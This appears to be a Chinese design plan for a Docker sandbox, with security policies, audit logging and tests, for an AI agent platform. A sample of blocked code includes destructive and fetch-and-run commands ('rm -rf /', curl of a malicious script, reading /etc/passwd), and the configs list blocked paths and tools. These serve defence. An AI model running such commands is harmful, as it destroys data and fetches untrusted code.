# v4.1 (Sandbox) 升级方案

**版本**: v4.1 Sandbox Security
**基于**: v4.0 Leader Mode  
**状态**: 📝 规划中
**优先级**: 高
**预计工期**: 3-4周

---

## 📋 版本概述

v4.1在v4.0 Leader Mode的基础上，引入**安全沙箱环境**，为Agent执行提供隔离、安全、可控的运行时环境。这是claude-code-auto迈向生产级AI Agent平台的关键一步。

### 核心目标

1. **安全隔离**: 防止恶意代码对宿主系统造成损害
2. **资源控制**: 限制CPU、内存、磁盘、网络等资源使用
3. **审计追踪**: 记录所有敏感操作和安全事件
4. **策略引擎**: 灵活配置安全策略，适应不同使用场景
5. **向后兼容**: 支持沙箱模式和原生模式无缝切换

---

## 🎯 核心特性

### 1. Docker沙箱环境 🐳

**功能**:
- 每个任务在独立的Docker容器中执行
- 自动构建和管理容器生命周期
- 支持自定义镜像和预构建基础镜像
- 容器资源配额管理

**优势**:
- ✅ 完全隔离的执行环境
- ✅ 防止文件系统污染
- ✅ 网络隔离和策略控制
- ✅ 易于清理和回收资源

### 2. 文件系统隔离 📁

**功能**:
- 挂载只读工作目录
- 临时输出目录（任务完成后同步）
- 敏感路径黑名单
- 文件操作审计日志

**保护措施**:
- 🛡️ 禁止访问 `/etc/passwd`, `/root`, `/home` 等系统目录
- 🛡️ 限制文件写入大小
- 🛡️ 检测并拦截可疑文件操作

### 3. 网络访问控制 🌐

**功能**:
- 白名单域名策略
- 禁止访问内网IP
- 流量监控和限速
- DNS查询审计

**示例策略**:
```yaml
network_policy:
  mode: whitelist  # whitelist, blacklist, disabled
  allowed_domains:
    - api.anthropic.com
    - github.com
    - pypi.org
  blocked_ips:
    - 192.168.0.0/16
    - 10.0.0.0/8
    - 172.16.0.0/12
  max_bandwidth_mbps: 10
```

### 4. 资源配额管理 ⚙️

**限制维度**:
- CPU: 核心数和使用率上限
- Memory: 最大内存使用量
- Disk: 临时存储空间配额
- Network: 带宽和连接数限制
- Time: 任务执行超时

**示例配置**:
```yaml
resource_limits:
  cpu_cores: 2
  cpu_percent: 80
  memory_mb: 2048
  disk_mb: 5000
  max_network_connections: 50
  task_timeout_seconds: 600
```

### 5. 代码执行沙箱 🔒

**功能**:
- Python代码静态分析（AST检查）
- 危险函数调用拦截
- 导入模块白名单
- 运行时监控和终止

**拦截示例**:
```python
# ❌ 被拦截的危险操作
os.system("rm -rf /")
subprocess.call(["curl", "malicious.com/script.sh"])
eval("__import__('os').system('cat /etc/passwd')")
exec(user_input)  # 动态代码执行

# ✅ 允许的正常操作
import pandas as pd
df = pd.read_csv("data.csv")
result = analyze_data(df)
```

### 6. 安全策略引擎 🛡️

**功能**:
- 多级安全策略（strict, moderate, permissive）
- 自定义策略规则
- 实时策略热更新
- 违规行为自动响应

**策略示例**:
```yaml
security_policies:
  default_level: moderate
  
  levels:
    strict:
      allow_network: false
      allow_file_write: false
      allow_subprocess: false
      max_execution_time: 300
    
    moderate:
      allow_network: true
      network_whitelist: ["api.anthropic.com"]
      allow_file_write: true
      writable_paths: ["./output", "./temp"]
      allow_subprocess: false
    
    permissive:
      allow_network: true
      allow_file_write: true
      allow_subprocess: true
      subprocess_whitelist: ["git", "npm", "python"]
```

### 7. 审计和监控 📊

**审计内容**:
- 所有文件操作（读、写、删除）
- 网络请求（URL、方法、状态码）
- 子进程创建
- 安全策略违规事件
- 资源使用统计

**日志格式**:
```json
{
  "timestamp": "2025-11-22T10:30:45Z",
  "session_id": "abc123",
  "mission_id": "mission_1",
  "event_type": "file_write",
  "action": "write_file",
  "target": "./output/report.md",
  "size_bytes": 15234,
  "allowed": true,
  "policy": "moderate"
}
```

---

## 🏗️ 架构设计

### 系统架构图

```
┌─────────────────────────────────────────────────────────────┐
│                    Leader Agent (v4.0)                       │
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐      │
│  │   Mission    │  │  Intervention│  │   Resource   │      │
│  │  Decomposer  │  │    Engine    │  │   Registry   │      │
│  └──────────────┘  └──────────────┘  └──────────────┘      │
└──────────────────────────┬──────────────────────────────────┘
                           │
                    Execute Mission
                           │
                           ▼
┌─────────────────────────────────────────────────────────────┐
│              Sandbox Manager (v4.1 NEW)                      │
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐      │
│  │   Container  │  │   Security   │  │    Audit     │      │
│  │   Manager    │  │   Policy     │  │    Logger    │      │
│  └──────────────┘  └──────────────┘  └──────────────┘      │
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐      │
│  │   Resource   │  │   Network    │  │  Filesystem  │      │
│  │   Monitor    │  │   Filter     │  │   Isolator   │      │
│  └──────────────┘  └──────────────┘  └──────────────┘      │
└──────────────────────────┬──────────────────────────────────┘
                           │
                   Create Container
                           │
                           ▼
┌─────────────────────────────────────────────────────────────┐
│             Docker Container (Isolated Environment)          │
│                                                              │
│  ┌────────────────────────────────────────────────────┐    │
│  │              Executor Agent (v4.0)                  │    │
│  │  ┌────────────┐  ┌────────────┐  ┌────────────┐   │    │
│  │  │   ReAct    │  │   Persona  │  │    Tool    │   │    │
│  │  │   Engine   │  │   Engine   │  │  Registry  │   │    │
│  │  └────────────┘  └────────────┘  └────────────┘   │    │
│  └────────────────────────────────────────────────────┘    │
│                                                              │
│  Resource Limits: CPU=2, Mem=2GB, Disk=5GB, Time=600s      │
│  Network: Whitelist only                                    │
│  Filesystem: Read-only + Output mount                       │
└─────────────────────────────────────────────────────────────┘
```

### 核心组件

#### 1. SandboxManager (沙箱管理器)

**职责**:
- 创建和销毁Docker容器
- 加载和应用安全策略
- 监控容器资源使用
- 收集审计日志

**接口**:
```python
class SandboxManager:
    async def create_sandbox(
        self,
        mission: SubMission,
        security_level: str = "moderate"
    ) -> Sandbox:
        """创建沙箱环境"""
    
    async def execute_in_sandbox(
        self,
        sandbox: Sandbox,
        task: str,
        persona: str
    ) -> ExecutionResult:
        """在沙箱中执行任务"""
    
    async def cleanup_sandbox(
        self,
        sandbox: Sandbox,
        preserve_outputs: bool = True
    ) -> None:
        """清理沙箱环境"""
    
    async def get_sandbox_stats(
        self,
        sandbox: Sandbox
    ) -> ResourceStats:
        """获取沙箱资源使用统计"""
```

#### 2. SecurityPolicy (安全策略)

**职责**:
- 定义安全规则
- 验证操作合法性
- 记录策略违规

**接口**:
```python
class SecurityPolicy:
    def check_file_operation(
        self,
        operation: str,  # read, write, delete
        path: str
    ) -> PolicyDecision:
        """检查文件操作"""
    
    def check_network_request(
        self,
        url: str,
        method: str
    ) -> PolicyDecision:
        """检查网络请求"""
    
    def check_subprocess(
        self,
        command: List[str]
    ) -> PolicyDecision:
        """检查子进程启动"""
    
    def check_resource_usage(
        self,
        stats: ResourceStats
    ) -> PolicyDecision:
        """检查资源使用"""

@dataclass
class PolicyDecision:
    allowed: bool
    reason: str
    alternative: Optional[str] = None
```

#### 3. ContainerManager (容器管理器)

**职责**:
- Docker容器生命周期管理
- 镜像构建和缓存
- 网络和存储配置

**接口**:
```python
class ContainerManager:
    async def build_image(
        self,
        base_image: str,
        requirements: List[str]
    ) -> str:
        """构建自定义镜像"""
    
    async def start_container(
        self,
        image: str,
        resource_limits: ResourceLimits,
        network_config: NetworkConfig,
        volume_mounts: List[VolumeMount]
    ) -> Container:
        """启动容器"""
    
    async def stop_container(
        self,
        container: Container,
        force: bool = False
    ) -> None:
        """停止容器"""
    
    async def get_container_logs(
        self,
        container: Container
    ) -> str:
        """获取容器日志"""
```

#### 4. AuditLogger (审计日志)

**职责**:
- 记录所有安全相关事件
- 结构化日志存储
- 支持查询和分析

**接口**:
```python
class AuditLogger:
    def log_file_operation(
        self,
        session_id: str,
        mission_id: str,
        operation: str,
        path: str,
        allowed: bool,
        policy: str
    ) -> None:
        """记录文件操作"""
    
    def log_network_request(
        self,
        session_id: str,
        mission_id: str,
        url: str,
        method: str,
        status_code: int,
        allowed: bool
    ) -> None:
        """记录网络请求"""
    
    def log_policy_violation(
        self,
        session_id: str,
        mission_id: str,
        violation_type: str,
        details: Dict[str, Any]
    ) -> None:
        """记录策略违规"""
    
    def query_events(
        self,
        session_id: Optional[str] = None,
        event_type: Optional[str] = None,
        start_time: Optional[datetime] = None,
        end_time: Optional[datetime] = None
    ) -> List[AuditEvent]:
        """查询审计事件"""
```

---

## 📁 文件结构

```
src/core/sandbox/
├── __init__.py
├── sandbox_manager.py       # 沙箱管理器 (400+ 行)
├── security_policy.py       # 安全策略引擎 (350+ 行)
├── container_manager.py     # 容器管理器 (300+ 行)
├── resource_monitor.py      # 资源监控 (200+ 行)
├── audit_logger.py          # 审计日志 (250+ 行)
├── network_filter.py        # 网络过滤器 (200+ 行)
└── filesystem_isolator.py   # 文件系统隔离 (180+ 行)

resources/sandbox/
├── policies/
│   ├── strict.yaml          # 严格策略
│   ├── moderate.yaml        # 中等策略
│   └── permissive.yaml      # 宽松策略
├── dockerfiles/
│   ├── python-base.Dockerfile
│   ├── nodejs-base.Dockerfile
│   └── research-tools.Dockerfile
└── templates/
    └── docker-compose.template.yaml

config/sandbox.yaml          # 沙箱配置
logs/audit/                  # 审计日志目录
  ├── events.jsonl
  ├── violations.jsonl
  └── resources.jsonl

tests/
├── test_sandbox_manager.py
├── test_security_policy.py
├── test_container_manager.py
└── integration/
    └── test_sandbox_e2e.py
```

---

## ⚙️ 配置说明

### config/sandbox.yaml

```yaml
# v4.1 Sandbox Configuration

sandbox:
  # 全局开关
  enabled: false  # 设为true启用沙箱模式
  
  # 容器配置
  container:
    runtime: docker  # docker, podman
    base_image: python:3.11-slim
    network_mode: bridge  # bridge, host, none
    auto_cleanup: true
    preserve_on_error: true  # 错误时保留容器用于调试
  
  # 资源限制
  resource_limits:
    cpu_cores: 2
    cpu_percent: 80
    memory_mb: 2048
    swap_mb: 512
    disk_mb: 5000
    max_processes: 100
    max_open_files: 1000
    max_network_connections: 50
    task_timeout_seconds: 600
  
  # 安全策略
  security:
    default_level: moderate  # strict, moderate, permissive
    policy_file: resources/sandbox/policies/moderate.yaml
    
    # 文件系统
    filesystem:
      read_only_root: true
      allowed_write_paths:
        - /workspace/output
        - /tmp
      blocked_paths:
        - /etc/passwd
        - /etc/shadow
        - /root
        - /home
      max_file_size_mb: 100
    
    # 网络
    network:
      mode: whitelist  # whitelist, blacklist, disabled
      whitelist_file: resources/sandbox/network_whitelist.txt
      allowed_domains:
        - api.anthropic.com
        - github.com
        - pypi.org
        - npmjs.com
      blocked_ips:
        - 192.168.0.0/16
        - 10.0.0.0/8
        - 172.16.0.0/12
      max_bandwidth_mbps: 10
      dns_filtering: true
    
    # 代码执行
    code_execution:
      python:
        enabled: true
        ast_check: true
        blocked_imports:
          - __builtin__
          - ctypes
          - subprocess  # 除非明确允许
        blocked_functions:
          - eval
          - exec
          - compile
          - __import__
      
      subprocess:
        enabled: false
        whitelist:
          - git
          - npm
          - pip
        blacklist:
          - rm
          - dd
          - mkfs
  
  # 审计
  audit:
    enabled: true
    log_dir: logs/audit
    log_format: jsonl  # jsonl, json, csv
    retention_days: 30
    events:
      - file_operations
      - network_requests
      - subprocess_calls
      - policy_violations
      - resource_usage
    
  # 监控
  monitoring:
    enabled: true
    interval_seconds: 5
    metrics:
      - cpu_usage
      - memory_usage
      - disk_usage
      - network_traffic
    alert_thresholds:
      cpu_percent: 90
      memory_percent: 85
      disk_percent: 90
```

### resources/sandbox/policies/moderate.yaml

```yaml
# 中等安全策略

name: moderate
description: 平衡安全性和功能性的中等策略

file_operations:
  read:
    allowed: true
    excluded_paths:
      - /etc/passwd
      - /etc/shadow
      - /root/*
      - /home/*
  
  write:
    allowed: true
    allowed_paths:
      - /workspace/output/*
      - /tmp/*
    max_file_size_mb: 100
  
  delete:
    allowed: true
    allowed_paths:
      - /workspace/output/*
      - /tmp/*

network_access:
  enabled: true
  mode: whitelist
  
  whitelist:
    - api.anthropic.com
    - github.com
    - raw.githubusercontent.com
    - pypi.org
    - files.pythonhosted.org
    - npmjs.com
    - registry.npmjs.org
  
  blocked_ips:
    - 192.168.0.0/16
    - 10.0.0.0/8
    - 172.16.0.0/12
    - 127.0.0.0/8
  
  protocols:
    https: allowed
    http: allowed
    ftp: blocked
    ssh: blocked

subprocess:
  enabled: false
  whitelist: []
  
python_execution:
  ast_validation: true
  
  blocked_imports:
    - __builtin__
    - ctypes
    - subprocess
    - os.system
  
  blocked_functions:
    - eval
    - exec
    - compile
    - __import__
    - open  # 使用工具的write_file/read_file替代

resource_limits:
  cpu_cores: 2
  memory_mb: 2048
  disk_mb: 5000
  max_execution_time: 600
  max_network_bandwidth_mbps: 10

violations:
  action: log_and_block  # log_only, log_and_block, terminate
  notification: true
  escalation_threshold: 3  # 3次违规后升级处理
```

---

## 🔄 集成到Leader Agent

### 修改 leader_agent.py

```python
from src.core.sandbox.sandbox_manager import SandboxManager
from src.core.sandbox.security_policy import SecurityPolicy

class LeaderAgent:
    def __init__(self, ..., enable_sandbox: bool = False):
        # ... 现有初始化代码 ...
        
        # v4.1: 沙箱管理器
        self.enable_sandbox = enable_sandbox
        if self.enable_sandbox:
            self.sandbox_manager = SandboxManager(
                security_level=config.sandbox.security.default_level,
                resource_limits=config.sandbox.resource_limits,
                audit_logger=AuditLogger(config.sandbox.audit)
            )
            logger.info("🔒 Sandbox mode enabled")
    
    async def _execute_mission(
        self,
        mission: SubMission,
        context: ExecutionContext
    ) -> Dict[str, Any]:
        """执行单个任务（支持沙箱模式）"""
        
        if self.enable_sandbox:
            # v4.1: 在沙箱中执行
            return await self._execute_mission_sandboxed(mission, context)
        else:
            # v4.0: 原生执行
            return await self._execute_mission_native(mission, context)
    
    async def _execute_mission_sandboxed(
        self,
        mission: SubMission,
        context: ExecutionContext
    ) -> Dict[str, Any]:
        """在沙箱中执行任务"""
        
        # 1. 创建沙箱
        sandbox = await self.sandbox_manager.create_sandbox(
            mission=mission,
            security_level=self._determine_security_level(mission)
        )
        
        try:
            # 2. 在沙箱中执行
            result = await self.sandbox_manager.execute_in_sandbox(
                sandbox=sandbox,
                task=mission.goal,
                persona=self._select_persona(mission),
                timeout=mission.estimated_time_seconds
            )
            
            # 3. 收集统计信息
            stats = await self.sandbox_manager.get_sandbox_stats(sandbox)
            result['sandbox_stats'] = stats
            
            logger.info(
                f"✅ Mission '{mission.id}' completed in sandbox. "
                f"CPU: {stats.cpu_percent}%, Memory: {stats.memory_mb}MB"
            )
            
            return result
            
        except SandboxViolationError as e:
            logger.error(f"🚫 Security violation in mission '{mission.id}': {e}")
            raise
        
        finally:
            # 4. 清理沙箱
            await self.sandbox_manager.cleanup_sandbox(
                sandbox,
                preserve_outputs=True
            )
    
    def _determine_security_level(self, mission: SubMission) -> str:
        """根据任务类型确定安全级别"""
        
        # 高风险任务使用严格策略
        high_risk_types = ["code_execution", "system_automation"]
        if mission.type in high_risk_types:
            return "strict"
        
        # 低风险任务使用宽松策略
        low_risk_types = ["market_research", "documentation"]
        if mission.type in low_risk_types:
            return "permissive"
        
        # 默认中等策略
        return "moderate"
```

---

## 🧪 测试方案

### 单元测试

#### test_sandbox_manager.py

```python
import pytest
from src.core.sandbox.sandbox_manager import SandboxManager
from src.core.sandbox.security_policy import SecurityLevel

@pytest.mark.asyncio
async def test_create_and_cleanup_sandbox():
    """测试沙箱创建和清理"""
    manager = SandboxManager()
    
    mission = SubMission(
        id="test_mission",
        type="market_research",
        goal="Test goal"
    )
    
    # 创建沙箱
    sandbox = await manager.create_sandbox(
        mission=mission,
        security_level="moderate"
    )
    
    assert sandbox is not None
    assert sandbox.container_id is not None
    
    # 清理沙箱
    await manager.cleanup_sandbox(sandbox)
    
    # 验证容器已删除
    assert not await manager.container_manager.container_exists(
        sandbox.container_id
    )

@pytest.mark.asyncio
async def test_sandbox_resource_limits():
    """测试资源限制"""
    manager = SandboxManager()
    
    # 设置低资源限制
    limits = ResourceLimits(
        cpu_cores=1,
        memory_mb=512,
        disk_mb=1000
    )
    
    sandbox = await manager.create_sandbox(
        mission=test_mission,
        resource_limits=limits
    )
    
    # 执行资源密集型任务
    with pytest.raises(ResourceLimitExceeded):
        await manager.execute_in_sandbox(
            sandbox,
            task="Create a 2GB file",
            persona="developer"
        )

@pytest.mark.asyncio
async def test_security_policy_enforcement():
    """测试安全策略执行"""
    manager = SandboxManager(security_level="strict")
    
    sandbox = await manager.create_sandbox(test_mission)
    
    # 尝试访问禁止路径
    with pytest.raises(SecurityViolationError):
        await manager.execute_in_sandbox(
            sandbox,
            task="Read /etc/passwd file",
            persona="developer"
        )
    
    # 尝试网络访问（strict模式禁止）
    with pytest.raises(SecurityViolationError):
        await manager.execute_in_sandbox(
            sandbox,
            task="Fetch data from malicious.com",
            persona="researcher"
        )
```

### 集成测试

#### test_sandbox_e2e.py

```python
@pytest.mark.integration
@pytest.mark.asyncio
async def test_leader_agent_with_sandbox():
    """端到端测试: Leader Agent + Sandbox"""
    
    # 配置
    config = WorkflowConfig(
        leader=LeaderConfig(enabled=True),
        sandbox=SandboxConfig(
            enabled=True,
            security_level="moderate"
        )
    )
    
    # 创建Leader Agent
    leader = LeaderAgent(
        work_dir="test_workspace",
        enable_sandbox=True,
        **config.leader.dict()
    )
    
    # 执行目标
    result = await leader.execute(
        goal="完成一个简单的市场调研任务",
        session_id="test_session"
    )
    
    # 验证结果
    assert result['success'] is True
    assert 'deliverable' in result
    assert 'sandbox_stats' in result
    
    # 验证审计日志
    audit_events = leader.sandbox_manager.audit_logger.query_events(
        session_id="test_session"
    )
    assert len(audit_events) > 0
```

---

## 📊 性能影响评估

### 预期开销

| 指标 | 原生模式 | 沙箱模式 | 增加 |
|------|----------|----------|------|
| 启动时间 | 1-2秒 | 5-8秒 | +300-400% |
| 内存开销 | 500MB | 800MB | +60% |
| CPU开销 | 基准 | +10-15% | +10-15% |
| 磁盘I/O | 基准 | +5-10% | +5-10% |
| 网络延迟 | 基准 | +2-5ms | 微小 |

### 优化策略

1. **容器池预热**: 预先创建常用容器，减少启动时间
2. **镜像缓存**: 缓存基础镜像，避免重复构建
3. **增量同步**: 只同步变更的文件，减少I/O
4. **异步清理**: 任务完成后异步清理容器，不阻塞主流程

---

## 🔐 安全增强

### 威胁模型

#### 1. 恶意代码注入

**场景**: Agent生成并执行恶意代码

**防护**:
- ✅ Docker容器隔离
- ✅ 只读文件系统
- ✅ 网络白名单
- ✅ Python AST静态分析

#### 2. 数据泄露

**场景**: Agent尝试读取敏感文件或发送数据到外部

**防护**:
- ✅ 文件系统黑名单
- ✅ 网络过滤
- ✅ 审计日志记录所有操作

#### 3. 资源耗尽攻击

**场景**: Agent消耗大量资源导致DoS

**防护**:
- ✅ CPU/内存/磁盘配额
- ✅ 超时机制
- ✅ 资源监控和告警

#### 4. 容器逃逸

**场景**: 攻击者尝试从容器逃逸到宿主机

**防护**:
- ✅ 使用非root用户运行
- ✅ 禁用特权模式
- ✅ Seccomp和AppArmor配置
- ✅ 最新Docker版本

---

## 📈 与v4.0对比

| 维度 | v4.0 Leader | v4.1 Sandbox | 提升 |
|------|-------------|--------------|------|
| **安全性** | 基础 | 企业级 | +300% |
| **隔离性** | 无 | Docker容器 | ∞ |
| **资源控制** | 无 | 细粒度配额 | 全新 |
| **审计能力** | 成本日志 | 完整安全审计 | +500% |
| **策略引擎** | 无 | 多级可配置 | 全新 |
| **风险评估** | 手动 | 自动化 | +200% |
| **启动时间** | 快 | 中等 | -70% |
| **内存开销** | 低 | 中等 | +60% |
| **适用场景** | 开发/测试 | 生产环境 | ✅ |

---

## 🚀 实施计划

### Week 1: 基础设施

- [x] 设计SandboxManager架构
- [ ] 实现ContainerManager（Docker集成）
- [ ] 实现基础ResourceMonitor
- [ ] 创建基础Docker镜像
- [ ] 单元测试

**交付物**:
- `src/core/sandbox/container_manager.py`
- `src/core/sandbox/resource_monitor.py`
- `resources/sandbox/dockerfiles/`
- `tests/test_container_manager.py`

### Week 2: 安全策略

- [ ] 实现SecurityPolicy引擎
- [ ] 实现FilesystemIsolator
- [ ] 实现NetworkFilter
- [ ] 创建3个预设策略（strict/moderate/permissive）
- [ ] 策略测试

**交付物**:
- `src/core/sandbox/security_policy.py`
- `src/core/sandbox/filesystem_isolator.py`
- `src/core/sandbox/network_filter.py`
- `resources/sandbox/policies/`
- `tests/test_security_policy.py`

### Week 3: 集成和审计

- [ ] 实现SandboxManager主类
- [ ] 实现AuditLogger
- [ ] 集成到LeaderAgent
- [ ] 修改config.py和config.yaml
- [ ] 集成测试

**交付物**:
- `src/core/sandbox/sandbox_manager.py`
- `src/core/sandbox/audit_logger.py`
- 修改后的`src/core/leader/leader_agent.py`
- 修改后的`src/config.py`, `config.yaml`
- `tests/integration/test_sandbox_e2e.py`

### Week 4: 优化和文档

- [ ] 容器池预热机制
- [ ] 性能优化
- [ ] 完整文档
- [ ] 用户指南
- [ ] 生产环境验证

**交付物**:
- `docs/SANDBOX_MODE_GUIDE.md`
- `docs/SANDBOX_SECURITY_BEST_PRACTICES.md`
- `docs/V4.1_COMPLETION_SUMMARY.md`
- 性能测试报告

---

## 📚 用户指南示例

### 快速开始

**1. 启用沙箱模式**

编辑 `config.yaml`:
```yaml
sandbox:
  enabled: true
  security:
    default_level: moderate
```

**2. 运行任务**

```bash
python src/main.py
```

**3. 观察沙箱日志**

```bash
# 实时监控
tail -f logs/audit/events.jsonl

# 查看资源使用
tail -f logs/audit/resources.jsonl
```

### 高级配置

**自定义安全策略**:

```yaml
# config/my_custom_policy.yaml
name: custom
description: 我的自定义策略

file_operations:
  write:
    allowed: true
    allowed_paths:
      - /workspace/output/*
      - /workspace/data/*

network_access:
  enabled: true
  whitelist:
    - api.anthropic.com
    - mycompany.com
```

然后在config.yaml中引用:
```yaml
sandbox:
  security:
    default_level: custom
    policy_file: config/my_custom_policy.yaml
```

---

## ⚠️ 注意事项

### 系统要求

- Docker 20.10+
- Python 3.11+
- 至少4GB可用内存
- 至少20GB可用磁盘空间

### 限制和约束

1. **性能开销**: 沙箱模式会增加30-60%的内存开销和5-8秒启动时间
2. **功能限制**: 某些需要系统级权限的操作无法在沙箱中执行
3. **兼容性**: 部分MCP服务器可能不兼容沙箱环境
4. **调试难度**: 沙箱中的错误可能更难调试

### 最佳实践

1. **开发阶段**: 使用原生模式，快速迭代
2. **测试阶段**: 使用`permissive`策略，确保功能正常
3. **生产环境**: 使用`strict`或`moderate`策略，最大化安全性
4. **定期审计**: 每周review审计日志，发现潜在问题

---

## 🎯 成功标准

### 功能完整性

- [x] 所有核心组件实现完成
- [ ] 3种预设安全策略可用
- [ ] Leader Agent完整集成
- [ ] 支持原生/沙箱模式无缝切换

### 安全性

- [ ] 通过OWASP Top 10安全测试
- [ ] 阻止已知容器逃逸漏洞
- [ ] 审计日志覆盖率100%
- [ ] 零敏感数据泄露

### 性能

- [ ] 沙箱启动时间 < 10秒
- [ ] 内存开销 < 1GB
- [ ] CPU开销 < 20%
- [ ] 任务成功率 > 95%

### 可用性

- [ ] 配置简单（3步启用）
- [ ] 文档完整（用户指南+最佳实践）
- [ ] 错误信息清晰
- [ ] 调试工具完善

---

## 🎊 结论

v4.1 Sandbox是claude-code-auto走向生产级AI Agent平台的关键里程碑。通过引入Docker沙箱、安全策略引擎、资源控制和完整审计，v4.1将安全性提升到企业级标准，同时保持v4.0的强大智能编排能力。

**核心价值**:
1. 🔒 **企业级安全**: 防止恶意代码和数据泄露
2. ⚙️ **资源可控**: 精确限制CPU/内存/磁盘使用
3. 📊 **完整审计**: 所有操作可追溯、可分析
4. 🎯 **灵活策略**: 适应不同场景的安全需求
5. 🔄 **向后兼容**: 支持原生/沙箱模式自由切换

**下一步**: 开始Week 1开发，预计4周内完成v4.1全部功能。

---

**文档版本**: 1.0  
**作者**: Claude Code Agent  
**日期**: 2025-11-22  
**状态**: 📝 规划完成，待开发
